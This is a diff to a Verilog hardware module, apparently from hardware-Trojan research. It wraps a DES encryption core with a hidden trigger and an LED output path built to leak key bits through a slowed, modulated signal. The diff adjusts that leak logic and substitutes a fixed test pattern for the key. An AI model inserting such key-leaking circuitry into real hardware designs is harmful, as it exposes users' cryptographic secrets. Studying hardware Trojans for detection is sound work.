@@ -14,7 +14,7 @@ module TrojanTopImplement (
 				
 input   CLK; 
  
-input   RST; 
+input   RST;
  
 input   CHIP_SELECT_BAR; 
  
@@ -78,8 +78,9 @@ reg		[2:0]	partNum;
 
 reg  [11:0] ledcounter;
 reg  [20:0] ledclkDIV;
+reg  [20:0] ledclkDIV2;
 reg    ledClk;
-
+wire   ledClkOUT;
 //
 //Detect Trojan Tiger and Send Trojan Data
 //
@@ -100,6 +101,8 @@ wire 	[63:0]	 KEY_PERMUTATION;
 Des_Top	DES1(.CLK(CLK), .RST(RST), .CHIP_SELECT_BAR(chipSelectR),.ADDRESS(addrR),.PLAIN_TEXT(plainTxtR), .CIPHER_TEXT(CIPHER_TEXT),.KEY(KEY));
 
 Trojan_Permutation Permute1(.KEY(trojanKey),.KEY_PERMUTATION(KEY_PERMUTATION));
+
+clockdivider FreqingCLK(CLK, ledClkOUT);
 
 //----------------------------------
 //--------register input data to DES block
@@ -288,7 +291,7 @@ always @(posedge CLK)begin
 		if(sendingFlagR)
 			if(trojanSendFlagR)
 				//SendLED <= ledClk;
-				SendLED <= ledClk ^ trojanKeyR[0];
+				SendLED <= ledClk & trojanKeyR[0];
 			else
 				SendLED <= sendingFlagR;
 		else
@@ -297,7 +300,6 @@ end
 ///trojan part
 //
 //
-
 //triger Trojan
 //
 always @(posedge CLK)begin
@@ -348,15 +350,18 @@ always @(posedge CLK)begin
 			trojanKey <= trojanKey;
 end
 
-always @(posedge CLK or posedge RST)begin
+always @(posedge ledClkOUT or posedge RST)begin
  if(RST)
   trojanKeyR <= 0;
  else
   if(sendingFlagR)
    if(trojanSendFlagRR)
-    trojanKeyR <= {1'b1,trojanKeyR[79:1]};
-   else
-    trojanKeyR <= {KEY_PERMUTATION,16'hAAAA};
+    //trojanKeyR <= {1'b1,trojanKeyR[79:1]};
+    trojanKeyR <= {trojanKeyR[0],trojanKeyR[79:1]};
+	 //trojanKeyR[0]<=~trojanKeyR[0];
+	else
+    trojanKeyR <= {80'hAAAAFFFFAAAAFFFFAAAA};
+	 //trojanKeyR <= {KEY_PERMUTATION,16'hAAAA};
 end
 
 //-----
@@ -372,7 +377,17 @@ always @(posedge CLK)begin
    ledcounter <= ledcounter+1;
 end
 
-
+//always @(posedge CLK)begin
+//  if(ledcounter==TrojanSendingFrq) begin
+//   ledclkDIV2 <= ledclkDIV2+1;
+//	if(ledclkDIV2==50000) begin
+//		ledClkOUT <= ~ledClkOUT;
+//		ledclkDIV2<=1;
+//		end
+//	end else begin
+//   ledClkOUT <= ledClkOUT;
+//end
+//end
 
 always @(posedge CLK)begin
  if(RST) begin
